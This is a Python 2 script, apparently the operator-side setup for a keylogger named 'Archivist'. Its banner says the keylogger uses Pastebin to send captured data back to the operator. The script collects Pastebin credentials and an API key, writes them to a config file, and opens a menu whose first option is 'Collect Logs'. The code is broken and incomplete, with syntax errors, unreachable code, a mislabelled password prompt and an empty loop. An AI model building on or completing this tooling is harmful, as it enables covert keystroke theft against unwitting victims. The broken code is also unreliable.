#!/usr/bin/env python
import os
import sys
import json
import time

import subprocess

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from assets.chroma import text

options = webdriver.FirefoxOptions()
options.add_argument("--headless")

driver = webdriver.Firefox(firefox_options=options)

def cmdline(command):
    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True)

    return process.communicate()[0]

def banner():
	banner_ascii = """
 _______  ______    _______  __   __  ___   __   __  ___   _______  _______ 
|   _   ||    _ |  |       ||  | |  ||   | |  | |  ||   | |       ||       |
|  |_|  ||   | ||  |       ||  |_|  ||   | |  |_|  ||   | |  _____||_     _|
|       ||   |_||_ |       ||       ||   | |       ||   | | |_____   |   |  
|       ||    __  ||      _||       ||   | |       ||   | |_____  |  |   |  
|   _   ||   |  | ||     |_ |   _   ||   |  |     | |   |  _____| |  |   |  
|__| |__||___|  |_||_______||__| |__||___|   |___|  |___| |_______|  |___| 

"""
	info = """ 
+           	Welcome to Archivist		    <------+
|......................................................|
|..Before we begin we first have to make some quick  ..|
|..preperations. This Keylogger uses Pastebin as a   ..|
|..means of communicating back with you. So we will ...|
|..make sure everything is running smoothly on 
|..that end.
+---------------->
|..Whether you have a Pastebin account or not
|..This will just take a second.
+--------------------------->"""
	print text("cyan", banner_ascii)
	
	if not os.path.isfile('config.json'):
		print text("cyan", info)
		
		config["First Run"] = 'False'
		
		with open('config.json', 'wb') as outfile:
			json.dump(config, outfile)
			outfile.close()
			
			time.sleep(2)
			print text("+", "Config file updated")
			

def check_conf(config)
	if 'False' in config["First Run"]:
		cmdline("clear")
		
		while True:
			print text("\n\n+", "Please enter your Pastebin username")
			uname = raw_input("Username: ")
			print text("\n+", "Please enter your Pastebin password")
			pword = raw_input("Username: ")		 

			if uname == "" or pword == "":
				print text("!", "Something went wrong.")
				print text("!", "Please make sure to answer both prompts")
				time.sleep(2.5)
				cmdline("clear") 
			else:
				cmdline("clear")
				print text("+", "Open Pastebin to retrieve API key?")
				answer = raw_input("[Y]es/[N]o").lower()
				
				if answer == "y":
					driver = webdriver.Firefox()
					try:
						driver.get("https://pastebin.com/api#1")
					except:
						pass
				elif answer == "n":
					time.sleep(2)
					cmdline("clear")
					
				else:
					print text("!", "Unhandled Option")
					time.sleep(2)
					cmdline("clear")
				
				print text("\n+", "Please enter your API key.")
				API = raw_input("API Key: ")
				time.sleep(2.5)
				
				cmdline("clear")	
				break
				
				config = { 'First Run'	    : 'False',
				           'Pastebin'       : 'True',
				           'API'            :  API,
	           		           'Uname'          :  uname,
				           'Pword'          :  pword,
		                         }
				with open('config.json', 'wb') as outfile:
					json.dump(config, outfile)
					outfile.close()
					
					print text("\n+", "Config file updated")
				
				return config
				
def menu(config=conf):
	welcome = """
	
+----->       Welcome to Archivist's Menu       <------+
|......................................................|
|.. Please select an action.             [Q] to quit ..|	
|......................................................| 	
|.. [1] Collect Logs                                 ..|	
|.. [2] 



	"""
	cmdline("clear")
	
	while True:
	
	print text('cyan', welcome)	

if __name__ == "__main__":
	# Instantiate config 
	config = { 'First Run'	    : 'True',
		   'Pastebin'       : 'False',
	           'API'            : 'False',
	           'Uname'          : 'False',
	           'Pword'          : 'False',
		      }
	# Print banner
	banner()
	# Fill out the rest of the conf
	conf = check_conf(config)
	# Start menu
	menu(conf)


	
